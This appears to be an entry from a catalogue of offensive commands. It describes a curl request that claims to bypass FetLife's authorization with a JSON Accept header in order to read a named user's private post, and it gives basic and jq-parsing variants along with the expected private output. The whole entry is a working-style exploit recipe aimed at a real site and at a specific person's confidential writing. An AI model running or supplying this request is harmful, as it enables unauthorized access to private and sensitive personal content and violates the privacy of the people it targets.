---
id: 2ccd8eab-9896-467d-ac63-e017626791b8
name: curl-fetlife-private-post-json
type: command
executor: bash
data: >-
  curl https://fetlife.com/users/14104003/posts/7673012 -H "Cookie:
  _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not
  cur1"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:27.441Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - exploit
  - http
  - authorization-bypass
  - fetlife
verified: false
validated: true
submitted: true
---

# curl-fetlife-private-post-json

## Command

```bash
curl https://fetlife.com/users/14104003/posts/7673012 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```

## Description

Accesses private post JSON in FetLife by bypassing auth with JSON header, useful for extracting sensitive writings with a valid session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL (https://fetlife.com/users/14104003/posts/7673012) | Private post endpoint | Yes |
| -H "Cookie: _fl_sessionid={your-session}" | Session cookie | Yes |
| -H "Accept: application/json" | Enables bypass | Yes |
| --user-agent "not cur1" | UA customization | No |

## Examples

### Basic Usage

```bash
curl https://fetlife.com/users/14104003/posts/7673012 -H "Cookie: _fl_sessionid=abc123" -H "Accept: application/json" --user-agent "not cur1"
```

### Advanced Usage

Parse JSON with jq:

```bash
curl https://fetlife.com/users/14104003/posts/7673012 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1" | jq '.post.body'
```

## Expected Output

JSON: {"post":{"id":7673012,"body":"Private writing...","created_at":"...","visibility":"private"}}, revealing confidential content.

## Related

- [[commands/curl-fetlife-private-video-json]]
- [[procedures/Access-Private-FetLife-Posts-via-JSON]]
